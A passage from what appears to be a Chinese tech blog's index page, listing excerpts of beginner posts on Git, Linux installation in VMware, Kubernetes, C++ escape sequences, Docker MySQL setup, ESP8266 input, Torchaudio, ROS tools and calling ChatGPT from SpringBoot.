		文章目录 概述一、获取仓库1.1 初始化仓库1.2 克隆仓库 二、文件状态及更新操作2.1 文件状态变化周期2.2 检查文件状态2.2.1 完整查看状态2.2.2 简要查看状态 2.3 跟踪新文件2.4 暂存已修改的文件2.5 忽略文件2.5.1 文件 .gitignore 的格式规范如下：2.5.2 glob模式格式 2.6 查看已暂存和未暂存的修改2.7 提交更新2.8 移除文件2.9 移动文件 三、查看提交历史四、撤销操作4.1 使用amend重新提交4.2 取消暂存4.3 撤销对文件的修改 五、远程仓库的使用5.1 查看远程仓库5.2 添加远程仓库5.3 从远程仓库中抓取与拉取5.4 推送到远程仓库5.5 远程仓库的重命名与移除5.5.1 重命名5.5.2 移除 六、打标签6.1 列出标签6.2 创建标签6.2.1 附注标签6.2.2 轻量标签6.2.3 后期补打标签 6.3 共享标签6.3.1 共享单个标签6.3.2 共享所有标签 6.4 删除标签6.4.1 删除本地标签6.4.2 删除远程标签 6.5 Git别名 清香白莲素还真
半神半圣亦半仙，全儒全道是全贤，脑中真书藏万卷，掌握文武半边天。
概述 本文记录Git 完成各种工作时将会用到的各种基本命令。
包括配置并初始化一个仓库（repository）、开始或停止跟踪（track）文件、暂存（stage）或提交（commit）更改、忽略指定的文件和文件模式、撤销错误操作、浏览项目的历史版本以及不同提交（commits）之间的差异、如何向远程仓库推送（push）以及如何从你的远程仓库拉取（pull）文件等操作。
**注：**本次学习过程使用的是Windows系统。
一、获取仓库 Git有两种获取仓库的方法：
直接初始化一个尚未及逆行版本控制的本地目录文件夹作为Git仓库；克隆一个已存在的Git仓库； 1.1 初始化仓库 初始化仓库需要保证文件夹是文件夹，然后进入文件夹之后执行“git init”指令。
git init 可以通过cd指令切换到指定文件夹之中。
初始化之后会创建.git的子目录。
示例：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c7b5b119b475ed5c62904e18582a615f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/727333b2ac1c8ea013508273157c974c/" rel="bookmark">
			解决WPS拖动整行的操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如上图，想要把第4行的整行内容，平移到第1行。
1.选中第4行的整行
2.鼠标出现如图的样子时，按住鼠标左键，上移到第1行位置后，放开左键即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e6ba2e6bfbd55c5b43bdffb5cd623d8d/" rel="bookmark">
			首次部署Linux系统的经历
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我是一名电子信息工程专业的学生，有次在图书馆上自习的时候无意间看到其他同学的电脑屏幕，黑色的屏幕上显示着一行一行的代码，勾起了我无限的好奇，经过询问得知他是用的Linux操作系统，是和Windows完全不同的系统，看着手敲的shell命令唤起一个又一个功能，我也决定要学习下Linux系统。
经过了解得知，Linux与Windows还是有很大区别的。
1.我们熟知的Windows系统有非常成熟的界面系统，上手非常容易，而Linux是以文件为中心，甚至有的都没有界面，完全是通过命令行来运作，有一定的上手难度。
2.Windows正版一般都是需要收费才能够激活的，
但是Linux是一个开源系统，有非常多的开发者对其进行了二次开发，可玩性非常高，且免费。
3.从安全角度来说，Linux更胜一筹，在Windows中，很多后台运行的进程我们是很难发现和控制的，但是Linux不一样，在Linux上很容易发现问题，并且相较于 Windows可以很快的修复错误。经过简单的了解后，我打算自己手动部署一台Linux系统。
Linux系统有很多种，比较火的有Ubuntu, red hat, suse，debian, centos等等，都是各大厂商对原生Linux进行二次开发和优化而发行的。由于是第一次部署操作系统，我打算先从网上找下详细的安装教程进行学习，从B站，知乎，百度等渠道搜寻了不少教程，最后选择www.linuxprobe.co网站下边的部署Linux教程，相比其他的教程，这个是从头手把手教学，连系统下载地址都提供了，非常适合初学者。下边是我部署Linux系统的详细步骤。
1.首先我自己的笔记本电脑是装了Windows的，而且里边有自己常用的学习资料，游戏等的，所以我不能覆盖安装掉，所以我也选择了教程里边用虛拟机的方式来部署Linux。这样的好处是，我本身的Windows操作系统不会丢失，并且容错率比较高，假如我安装失败，不至于我的电脑起不来，只需要重新执行安装操作系统就可以了。而且只要你的硬盘空间够大，你可以同时安装多种Linux系统，非常方便。我这里选择了教程中的vmware workstation这款虚拟软件，他对我们硬件要求不高，而且功能非常丰富，比如可以在多个系统中进行文件互传，一键打通网络，还有强大的快照功能，相当于一键还原当前的操作。
2.下载完vmware workstation之后，双击安装一路默认就好，最后如果没有激活码，可以选择试用，或者可以以网上搜系对应版本的激活码也可以， 安装完成后，你会看到如下界面。
3.下载你想要部署Linux操作系统，我这里选择了红帽系统，然后点击上图中的创见新的虚拟机，然后可以选择自定义按钮进行定制安装，因为vm支持安装很多种的操作系统，所以这里我们要选择稍后安装操作系统，然后下一步我们选择Linux，版本选择你下载的红帽系统版本，然后下一步，选择填写虚拟机名称和存储位置，一般我会给操作系统最少预留20G空间，所以这里的存储位置不要选择我们自己的系统盘，可以选择D盘。然后定制处理器配置，初学可以默认使用1核2G就够了，这里如果想加大内存的话，是不能超过本机的实际内存的，并且如果设置的很大，你会发现你本机电脑会变得非常卡，所以我这
里设置成了1G内存。下一步是网络配置，建议大家选择仅主机模式，然后下一步，这里我都是选择默认配置没有变动，然后下一步给虚拟机磁盘文件命名，然后就到虚拟机设置页面了，这里选择cd/dvd选项，在右侧选择我们下载的红帽操作系统镜像，然后点击Ok保存，到这里我们在vm中的配置就结束了。
4.启动安装，点击界面的开启此虚拟机按钮，就可以看到红帽操作系统的安装界面了，里边会我们选择安装语言，默认账户和密码，一般这里设置成root就行，其他选项默认就好，然后就是漫长的等待，等待系统安装成功后会自动启动，如果安装一切正常你会看到如下登入界面：
5.进行到这里就说明我们安装操作系统成功了，输入登入成功后，就可以开始快乐了Linux之旅了，接下来我们可以通过执行rpm命令来安装一系列软件，如果不满足你的条件，也可以使用yum仓库的方式来安装你喜欢的软件。
最后还是要感谢刘老师写的如此详细的部署文档，还有通俗易懂的入门书籍《Linux就该这么学》，才让我的第一次Linux之旅如此顺利。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f07bdc7d2341ea66245186b855750423/" rel="bookmark">
			Kubernetes为何如此炙手可热？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在开发和部署云原生应用程序时，运行容器化负载的 Kubernetes 平台起到了重大作用。自然而然的，开发和部署云原生应用程序已经变得非常受欢迎。对于一个允许快速部署和连续交付的 bug 修复和新功能的流程来说，它有明显的优势，但是没有人会谈到鸡和鸡蛋问题：怎样才能达成这样的目的呢？从头开始构建基础设施和开发流程来开发和维护云原生应用程序是个不简单的、耗时的任务。 Kubernetes 是一个相对较新的运行容器化负载的平台，它解决了这些问题。它原本是 Google 内部的一个项目，Kubernetes 在 2015 年被捐赠给了云原生计算基金会，并吸引了来自世界各地开源社区的开发人员。 Kubernetes 的设计基于 Google 15 年的在生产和开发环境运维的经验。由于它是开源的，任何人都可以下载并使用它，并实现其带来的优势。
那么为什么 Kubernetes 会有这么大的惊喜呢？我认为它在像 OpenStack 这样的基础架构即服务（IaaS）和完整的平台即服务 （PaaS）的资源之间达到了最佳平衡，它的底层运行时实现完全由供应商控制。Kubernetes 提供了两个优势：对管理基础设施的抽象，以及深入裸机进行故障排除的工具和功能。
IaaS 与 PaaS
OpenStack 被大多数人归类为 IaaS 解决方案，其中物理资源池（如处理器、网络和存储）在不同用户之间分配和共享。它使用传统的基于硬件的虚拟化实现用户之间的隔离。
OpenStack 的 REST API 允许使用代码自动创建基础架构，但是这就是问题所在。IaaS 产品输出的也是基础设施。其创建后，支持和管理那些更多的基础设施的服务方式并不多。在一定程度上，OpenStack 生产的底层基础架构（如服务器和 IP 地址）成为管理工作的重中之重。一个众所周知的结果是虚拟机（VM）的无序蔓延，而同样的情况也出现于网络、加密密钥和存储卷方面。这样，开发人员建立和维护应用程序的时间就更少了。
像其它基于集群的解决方案一样，Kubernetes 以单个服务器级别的方式运行，以实现水平缩放。它可以轻松添加新的服务器，并立即在新硬件上安排负载。类似地，当服务器没有被有效利用或需要维护时，可以从集群中删除服务器。其它 Kubernetes 可以自动处理的其他任务是编排活动，如工作调度、健康监测和维护高可用性。
网络是另一个可能难以在 IaaS 环境中可靠编排的领域。微服务之间通过 IP 地址通信可能是很棘手的。Kubernetes 实现了 IP 地址管理、负载均衡、服务发现和 DNS 名称注册，以在集群内提供无痛、透明的网络环境。
专为部署而设计
一旦创建了运行应用程序的环境，部署就是一件小事了。可靠地部署一个应用程序是说起来容易做起来难的任务 —— 它并不是最简单的。Kubernetes 相对其他环境的巨大优势是，部署是一等公民。
使用一个单独的 Kubernetes 命令行界面（CLI）的命令，可以描述应用程序并将其安装在群集上。Kubernetes 从初始部署、推出新版本以及（当一个关键功能出现问题时）进行回滚，实现了应用程序的整个生命周期。运行中的部署也可以暂停和恢复。拥有现成的、内置的工具和支持应用程序部署，而不用自己构建部署系统，这是不容小觑的优点。Kubernetes 用户既不必重新发明应用程序部署的轮子，也不会发现这是一项艰巨的任务。
Kubernetes 还可以监控运行中的部署的状态。虽然你可以在 IaaS 环境中像编写部署过程一样编写这个功能，但这是一个非常困难的任务，而这样的情况还比比皆是。
专为 DevOps 而设计
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f07bdc7d2341ea66245186b855750423/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6ecabdd7b8f2c76509f08a426f831872/" rel="bookmark">
			C&#43;&#43;转义符及用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C++ 转义符 这些转义序列用于表示 C++ 字符串和字符字面量中的特殊字符，+*?^$\.[]{}()|/ 这些符号需要用反斜杠来进行转义。
转义符字符含义ASIC符号十进制ASCII码十六进制ASCII码\a振铃BEL70x7\b退格BS80x8\t水平制表符HT90x9\n换行符NL(LF)100xA\v垂直制表符VT110xB\f换页FF120xC\r回车CR130xD\\反斜杠\920x5C\"双引号“340x22\’单引号‘390x27\?问号？630x3F 例如，如果希望在字符串中包含双引号字符，则可以使用"转义序列来表示它。类似地，如果想在字符串中包含换行符，可以使用\n转义序列。
用法 下面是c++中使用转义序列的一个例子:
#include &lt;iostream&gt; int main() { std::cout &lt;&lt; "Hello, world!\n"; std::cout &lt;&lt; "This is a \"quoted\" string.\n"; std::cout &lt;&lt; "This is a\ttabbed\tstring.\n"; std::cout &lt;&lt; "This is a\bbackspaced string.\n"; std::cout &lt;&lt; "This is a\rreturn string.\n"; std::cout &lt;&lt; "This is a\fform feed string.\n"; std::cout &lt;&lt; "This is an\aalert (bell) string.\n"; std::cout &lt;&lt; "This is a\vvertical tabbed string.\n"; return 0; } 输出结果如下：
Hello, world!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6ecabdd7b8f2c76509f08a426f831872/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/24afab4b6a409643c4c68a4efa92e7b8/" rel="bookmark">
			AMIS【部署 01】amis前端低代码框架可视化编辑器amis-editor本地部署流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		amis-editor本地部署流程 1.amis-editor是什么1.1 amis是什么1.2 amis-editor是什么 2.amis-editor本地部署2.1 准备阶段2.2 源码修改2.3 构建项目2.4 nginx配置2.5 启动nginx 3.总结 官网仅贴出了本地运行这个项目的步骤： # 1.安装依赖 npm i # 2.等编译完成后本地打开页面看效果 npm run dev 我是后端开发工程师，对这类项目的打包部署并不是很了解，特此记录。
1.amis-editor是什么 1.1 amis是什么 amis 是一个低代码前端框架，它使用 JSON 配置来生成页面，可以减少页面开发工作量，极大提升效率。
使用JSON编写页面有以下好处：
无需前端知识： 对于不了解前端或JavaScript的用户，使用JSON配置的方式可以生成专业且复杂的后台界面，这是其他前端UI库无法轻松实现的。不受前端技术更新的影响： amis基于JSON配置，使得页面不受前端技术的快速更新影响。百度内部存在六年前创建的amis页面仍在使用，而当时的Angular/Vue/React版本已经被废弃。持续升级： amis不断提升用户体验，例如表格首行冻结和下拉框大数据处理。JSON配置无需修改，使得页面保持最新功能而不增加维护成本。可视化页面编辑器： amis提供可视化页面编辑器，允许完全使用可视化界面来制作页面，而不仅仅是静态原型。 amis的其他亮点：
完整的界面解决方案： amis通过JSON配置可以完成完整功能开发，包括数据获取、表单提交、验证等，无需二次开发即可直接上线。大量内置组件： amis内置120+组件，解决了一站式开发的问题，不需要依赖第三方组件库，确保展现和交互一致性。支持扩展： 除了低代码模式，还支持通过自定义组件进行扩展，可以实现90%低代码和10%代码开发的混合模式，提高效率和灵活性。容器支持无限级嵌套： 可以通过嵌套来满足各种布局和展现需求。经过实战验证： 在百度内部广泛使用，经过6年多时间创建了5万多个页面，涵盖了各种需求，从内容审核到机器管理，证明了amis的实用性。 amis不适合的情况：
大量定制UI： amis更适合用于有大量常见UI组件的页面，对于追求个性化视觉效果的面向普通客户（toC）的页面，不太适用。极为复杂或特殊的交互： 复杂的前端功能： 涉及大量定制拖拽操作等依赖原生DOM的功能无法使用amis。特殊交互： 对于某些特殊的交互，如可视化编辑器中的定制拖拽操作，amis可能无法提供解决方案，但后续版本可能会增加专门的组件支持。 1.2 amis-editor是什么 amis-editor 是 amis 的可视化编辑器，它能让开发者快速搭建后台页面，只需要通过拖拽组件等就可以生成对应的 JSON 代码。
2.amis-editor本地部署 可视化编辑器官网介绍：https://aisuda.bce.baidu.com/amis/zh-CN/docs/extend/editor
2.1 准备阶段 nodejs环境 C:\Users\Administrator&gt;node -v v16.14.0 获取项目代码，地址：https://github.com/aisuda/amis-editor-demo，我们仅需要以下代码即可： 2.2 源码修改 修改amis.config.js的build脚本配置信息，如下：
build: { entry: { index: '.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/24afab4b6a409643c4c68a4efa92e7b8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/26470377f390cd712ad835a12219ef0a/" rel="bookmark">
			logi options&#43;设置flow连接不上终于解决噜
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		连了一上午都找不到设备
各种换WiFi拔网线
fine
后面改成专用网络就OK了
哭 人家本来就傻
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/88359b49ef24e12556cca7fcdbf2f050/" rel="bookmark">
			NodeMCU ESP8266 读取按键外部输入信号详解（图文并茂）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1 前言2 常用接口pinModedigitalRead 3 项目示例3.1 原理图3.2 示例代码 4 结论 1 前言 ESP8266如何检测外部信号的输入，通常可以检测到TTL电平的高电平和低电平。
TTL（Transistor-Transistor Logic）电平是一种常用的数字电平标准，通常用于数字电路和逻辑电路中。TTL电平具有以下特征和定义：
输出状态 L：低于 0.8V；H：高于 2.4V； 输入状态： L：低于 1.2V；H：高于 2.0V； 下面我们需要通过构造外围的硬件电路来做外部信号输入的测试。
嵌入式开发中，读取按键输入通常涉及到与硬件交互，具体的实现方式取决于我们使用的嵌入式平台和硬件，通常我们需要注意的是；
了解硬件接口： 查阅嵌入式系统的文档，了解按键连接到哪些引脚，以及硬件产生的信号是怎样的。这可能涉及到GPIO（通用输入/输出）引脚、中断引脚等。
配置GPIO引脚： 如果按键连接到GPIO引脚，你需要配置这些引脚为输入模式。这通常需要设置相应的寄存器，具体的方法取决于你使用的微控制器或处理器。
轮询或中断处理： 有两种主要的按键读取方法：轮询和中断。在轮询中，你会周期性地检查按键状态，而中断则是当按键状态发生变化时触发相应的中断处理函数。
轮询方法： 在主循环中，不断读取按键的状态。例如，使用一个函数检查GPIO引脚的状态，如果检测到按键按下，则执行相应的操作。 // 伪代码，具体实现取决于硬件和编程语言 while (1) { if (read_button_state() == BUTTON_PRESSED) { // 处理按键按下的操作 } // 可以添加延时以避免过于频繁地检查 delay(100); } 中断方法： 配置相应的中断，并在中断服务程序中处理按键事件。 // 伪代码，具体实现取决于硬件和编程语言 void button_interrupt_handler() { // 处理按键事件 } int main() { // 配置GPIO引脚和中断 configure_button_interrupt(); while (1) { // 主循环中可以执行其他任务 } } 防抖动处理： 在读取按键输入时，通常需要考虑防抖动。防抖动是指在按键被按下或释放时，由于机械原因可能导致的信号不稳定性。可以通过在软件中添加延时或使用硬件滤波器来处理防抖动。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/88359b49ef24e12556cca7fcdbf2f050/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/288cadbfd1de9e9237723fe8f19cf404/" rel="bookmark">
			CAD/CASS高程点内插插件（可依据：图面高程点、两端高程点、图面等高线、图面三角网），均支持两种内插模式：逐个内插、线性内插。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		插件下载：QTools for AutoCAD
功能位置：gcd命令==&gt;高程点内插
功能介绍：高程点内插插件，含4种高程参考模式：图面高程点、两端高程点、图面等高线、图面三角网，支持4种内插模式：逐个内插、指定两点间等距内插、所选曲线上等距内插、所选曲线节点位置内插。
功能截图：
视频演示：
高程点内插插件
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9c952509dca99fdf2a5cb62abd7d6c45/" rel="bookmark">
			pytorch深度学习入门（5）之-Torchaudio音频加载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Torchaudio简介 Torchaudio是一个用于处理音频数据的Python库，它是基于PyTorch的扩展库，提供了丰富的音频处理功能和一系列预处理方法，方便用户在音频领域进行机器学习和深度学习的研究。具体来说，Torchaudio提供了从音频文件的读取到加载，音频变换和增强，以及音频数据可视化的整套工具。此外，Torchaudio还集成了一些常见的音频数据集，方便用户快速获取和处理音频数据。
在安装方面，首先需要安装PyTorch，可以通过pip install torch命令来安装最新版本。然后，可以使用pip install torchaudio命令来安装Torchaudio库。
Torchaudio的读取音频文件功能通过torchaudio.load方法实现，该方法返回一个包含音频数据的waveform张量和采样率。同时，Torchaudio提供了一些常用的音频变换和增强方法，如时域混响、频域滤波等，方便用户对音频数据进行处理和增强。
总之，Torchaudio是PyTorch在音频处理领域的强大扩展，它提供了丰富的音频处理功能和预处理方法，方便用户在音频领域进行机器学习和深度学习的研究。
本教程展示如何使用 TorchAudio 的基本 I/O API 来检查音频数据、将其加载到 PyTorch Tensors 中并保存 PyTorch Tensors。
首先查看Torchaudio版本是否正确，建议使用2.1以上版本
import torch import torchaudio print(torch.__version__) print(torchaudio.__version__) 输出：
2.1.1 2.1.0 准备
首先，我们导入模块并下载本教程中使用的音频资源。
请使用以下命令安装所需的包，使用pip安装：
pip install boto3 import io import os import tarfile import tempfile import boto3 import matplotlib.pyplot as plt import requests from botocore import UNSIGNED from botocore.config import Config from IPython.display import Audio from torchaudio.utils import download_asset SAMPLE_GSM = download_asset("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9c952509dca99fdf2a5cb62abd7d6c45/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01d5312ddc5da495070fe43b377076a7/" rel="bookmark">
			docker安装mysql
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 docker安装不多说了，如果docker不能使用就换一下镜像源
vim	/etc/docker/daemon.json { "registry-mirrors": ["https://pee6w651.mirror.aliyuncs.com","http://hub-mirror.c.163.com"], "live-restore": true } 拉取镜像，不指定版本自动拉取最新版本
docker pull mysql:5.7 查看镜像
docker images 配置镜像启动
docker run --name mysql57 -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7 查看运行的容器
docker ps 运行成功后进入容器
docker exec -it mysql57 bash 开放防火墙3306端口
sudo firewall-cmd --zone=public --add-port=3306/tcp --permanent sudo firewall-cmd --reload 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/07b12fcb95ff918a7319ed05b94f6fc7/" rel="bookmark">
			十分钟搞定 SpringBoot 集成 ChatGPT，实战附源码！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在本指南中，我们将探索在 Spring Boot 应用程序中调用 OpenAI ChatGPT API 的过程。我们的目标是开发一个 Spring Boot 应用程序，能够利用 OpenAI ChatGPT API 生成对给定提示的响应。
您可能熟悉 ChatGPT 中的术语“提示”。在 ChatGPT 或类似语言模型的上下文中，提示是指用户提供的用于生成响应的输入或初始文本。它是您输入到模型中以获得相关输出的文本或查询。
提示本质上是作为语言模型理解和生成连贯响应的指令或起点。提示的质量和清晰度会显著影响模型提供准确且相关的信息或响应的能力。
1什么是 ChatGPT？ 我向 ChatGPT 提出了这个问题，看看它会产生什么反应。
ChatGPT 是一种生成式人工智能，允许用户输入提示并接收类似人类的图像、文本或视频形式的输出，所有这些都是由人工智能生成的。
ChatGPT 目前使用 GPT-3.5 模型，通过微调过程改进算法。然而，增强版本 ChatGPT Plus 包含了 GPT-4 模型。此升级版本拥有更快的响应时间，支持互联网插件，并展示了处理图像描述、图像标题生成等复杂任务的改进功能。
OpenAI 将 GPT-4 描述为比其前身 GPT-3.5 先进十倍。这一进步使模型能够表现出更好的上下文理解和细微差别，从而导致更精确和连贯的响应。
2OpenAI ChatGPT API 我们将调用create chat completion API (POST https://api.openai.com/v1/chat/completions )来生成对提示的响应。让我们探索一下 OpenAI ChatGTP API。
我们需要发送什么请求来调用 OpenAI API？ 访问“create chat completion API ” 链接后，可以看到有关端点、请求和响应的以下信息。
端点：POST https://api.openai.com/v1/chat/completions
转到 Playgroud 并输入任何消息，例如“什么是 Spring Boot？”
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/07b12fcb95ff918a7319ed05b94f6fc7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9f5d50591e700d824cca8558cef0d93c/" rel="bookmark">
			后端Long型数据传到前端js后精度丢失的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		假设一个场景，MybatisPlus的雪花算法生成long类型主键ID，存入数据库，前端获取到数据后，要执行一个更新操作（updateById），但这时会出现无法成功更新的情况！这是因为前端在长度大于17位时会出现精度丢失的问题。
Number转换19位(6145390195186705543)后结果为 6145390195186705000
造成原因：看网上资料说：js的number类型有个最大安全值，即2的53次方（9007199254740992），超过这个值就会出现精度丢失的问题。
经过个人测试，上面这个说法还是不准确的，应该是超过16位出现精度丢失，16位以后的数字都会转换成0。
这是因为JS是弱语言，前端接收数字类型参数为number，最大接收长度为16位，超出长度则会丢失精度，而JAVA的Long类型长度为19位，所以传输到前端的后三位精度丢失，所以我们解决该问题的思路就是：把java里的Long类型转换为String返回给前端。
作者：瓩千瓦
链接：https://www.jianshu.com/p/d2eb9795c359
来源：简书
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6133b39096e918b0d7107f5bf19972c2/" rel="bookmark">
			git用法笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一. 基本用法 1. 克隆代码 ​ git clone https://github.com/holylong/monitor 2. 初始化git项目，创建文件，添加文件，提交文件并附上提交者信息 git init touch README.md git add . git commit -m "first commit" -s 3. 添加远程地址，并提交到云端 git remote add origin https://github.com/holylong/example-apps git push -u origin master 二. 更新远程代码到本地 方式一：
1、查看远程仓库 git remote -v 2、从远程获取最新代码到本地 git fetch origin master 从远程origin仓库的master分支更新到本地 3、比较本地的仓库和远程参考的区别 git log -p master.. origin/master 4、把远程下载下来的代码合并到本地仓库，远程的和本地的合并 git merge origin/master 方式二：
1、查看远程仓库 git remote -v 2、从远程获取最新版本代码到本地 git fetch origin master:temp从远程origin仓库的master分支下载到本地并新建一个分支目录 3、比较本地仓库和远程参考的区别 git diff temp 比较master分支和temp分支的不同 4、合并temp分支到master分支 git merge temp 5、删除temp分支 git branch -a temp 三、常见一些问题如何解决 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6133b39096e918b0d7107f5bf19972c2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/95cc57fe393b91bd2f0c89509cb762e9/" rel="bookmark">
			【古月居《ros入门21讲》学习笔记】18_常用可视化工具的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
说明：
1. Qt工具箱
日志输出工具：rqt_console
绘制数据曲线：rqt_plot
图像渲染工具：rqt_image_view
综合工具：rqt
2. 三维可视化工具：Rviz
Rviz启动
使用示例
3. 仿真平台：Gazebo
Gazebo启动
模型环境查看
选择模型环境打开
说明： 1. 本系列学习笔记基于B站：古月居《ROS入门21讲》课程，且使用的Ubuntu与ROS系统版本与课程完全一致；
虚拟机版本Linux系统版本ROS系统版本VMware WorkStation Pro 16Ubuntu18.04Melodic 2. 课程中的所有示例代码均已跑通，且对Pyhon版本的代码也都做了运行验证，并附带验证过程（错误均已修正）；
3. 本节是整个笔记的第18节，对应视频课程的第20节，请自行对应学习；
4. 整个系列笔记基本已经完结，但部分章节仍需润色修改 ，后面会陆续发布，请大家持续关注， 创作不易，感谢支持！
这一章节介绍一些ROS中常用可视化工具的使用。 在前面的课程中我们曾经简单介绍过ROS中一个可视化工具：计算图，计算图可视化工具指令：rqt_graph 这里将较为详细的介绍一些其它的可视化工具，如：Qt工具箱、Rviz等。
1. Qt工具箱 日志输出工具：rqt_console 还是以小海龟为例，我们先来启动海龟例程
roscore rosrun turtlesim turtlesim_node 然后新建终端打开日志输出工具
rqt_console 然后打开海龟键盘控制节点，让海龟动起来，并撞上墙，rqt_console就会把日志信息都显示出来。
rosrun turtlesim turtle_teleop_key 绘制数据曲线：rqt_plot 前面已经打开了海龟控制的相关节点，这里我们打开数据绘图工具rqt_plot。
rqt_plot 在在左上角的输入框中输入左斜杠/可以看到自动填充项，我们选择 /turtle1/pose 按回车，就会显示位置信息的实时情况。
然后我们让海龟动起来，可以看到各个数据信息的变化，
rosrun turtlesim turtle_teleop_key 图像渲染工具：rqt_image_view rqt_image_view 默认里面是没有任何的图像的，需要插入摄像头，驱动摄像头跑起来，然后摄像头会不断的发布图像信息，在左上角选择图像信息的话题，rqt_image_view会把图像渲染出来，包括rgb的彩色值，如果使用rgbd的话，也可以显示深度图，红外图，只要符合ROS图像的定义都可以显示
综合工具：rqt rqt 直接输入rqt可以打开图形界面总接口 在Plugin菜单有各种图形界面的工具，选择点击可分块显示在下方， 前面我们介绍过的Qt工具包都可以在Plugin菜单里找到。
2. 三维可视化工具：Rviz 在前面的学习中我们就曾使用过Rviz来显示空间坐标系的相对位置。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/95cc57fe393b91bd2f0c89509cb762e9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fad532a9265603aea39e97dbc0956d6d/" rel="bookmark">
			让AI为你打工，腾讯混元大模型实战篇
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		👉导读
腾讯混元大模型 API 产品，可以实现对话沟通、内容生成、分析理解，可以广泛应用在智能客服、智能营销、角色扮演、广告文案创作、商品描述、剧本创作、简历生成、文章写作、代码生成、数据分析、内容分析等各类场景。本文目标将结合腾讯混元大模型实现，表设计，数据库连接，代码增删查改的实现等功能。
👉目录
1 操作教程
2 错误排查
3 代码测试
4 整体总结
01 操作教程
第一步：打开腾讯混元大模型。
第二步：定义角色。
让人工助手，真正的成为你需要的助手，给混元大模型一个新角色。
例如：你是以为优秀的 Java 软件开发人员。您的工作是使用 Java 语言 和 SpringBoot 框架开发应用程序和架构代码。下面我将为你提供一些关于 Java Web 应用程序要求的具体信息，请您根据具体信息，给出解决办法。
第三步：提出问题。
请我提供一个基于 SpringBoot 的框架，包含 pom.xml 和 yml 文件的配置，需要连接 MySQL 数据库。
混元回答：当然可以！ 以下是一个基于 SpringBoot 的框架，包含 pom.xml 和 application.yml 文件的配置，用于连接 MySQL 数据库。
pom.xml
&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.6.1&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fad532a9265603aea39e97dbc0956d6d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0a1e1d5ff0006cdafb4a9cb391d3b10b/" rel="bookmark">
			如何使用Chrome浏览器做前端页面性能分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
